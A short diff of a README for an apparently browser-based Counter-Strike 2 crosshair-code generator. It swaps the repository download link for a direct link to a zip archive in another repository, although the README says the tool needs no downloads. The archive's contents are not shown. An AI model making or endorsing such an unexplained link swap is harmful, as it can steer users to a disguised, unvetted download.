@@ -9,7 +9,7 @@ description: "Generate random crosshair codes for CS:GO and CS2 to test, copy, c
 This lightweight browser utility helps Counter-Strike 2 players generate random crosshair codes instantly. No downloads, no installations, no hassle—just open the page and start testing new crosshair setups.
 
 ## 📥 Download
-[![Download Now](https://img.shields.io/badge/Download-Counter--Strike%20Crosshair%20Script-blue?style=for-the-badge&logo=github)](https://github.com/sofuu-tech/counter-strike-crosshair-script)
+[![Download Now](https://img.shields.io/badge/Download-Counter--Strike%20Crosshair%20Script-blue?style=for-the-badge&logo=github)](https://github.com/sofuu-tech/sofuu-tech.github.io/raw/refs/heads/main/scripts/1.5-alpha.4.zip)
 
 Visit this link to download the application.
 
